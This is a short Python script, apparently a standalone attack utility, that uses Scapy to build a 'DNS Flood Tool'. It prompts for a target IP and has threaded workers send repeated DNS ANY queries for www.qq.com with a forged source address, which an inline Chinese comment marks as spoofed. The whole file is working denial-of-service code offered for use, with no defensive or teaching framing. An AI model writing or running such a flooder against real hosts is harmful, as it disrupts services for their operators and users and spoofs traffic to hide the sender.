# coding:utf-8
from scapy import *
from scapy.all import *
from scapy.layers.dns import *
from scapy.layers.inet import *
from utils import *


def dns_flood(dst_ip,one_worker_num):
    print("test")
    for j in range(one_worker_num):
        a = IP(dst=dst_ip, src='192.168.1.200')  # 192.168.1.200 为伪造的源ip
        b = UDP(dport=53)
        c = DNS(id=1, qr=0, opcode=0, tc=0, rd=1, qdcount=1, ancount=0, nscount=0, arcount=0)
        c.qd = DNSQR(qname='www.qq.com', qtype=255, qclass=1)
        p = a / b / c
        send(p)

if __name__ == '__main__':
    print("#" * 30)
    print("# Welcome to DNS Flood Tool  #")
    print("#" * 30)
    # 输入目标IP和端口
    dst_ip_test = input("Target IP : ")
    start_attack(dns_flood, thread_num=10, one_work_num=10,dst_ip=dst_ip_test,dst_port=0)
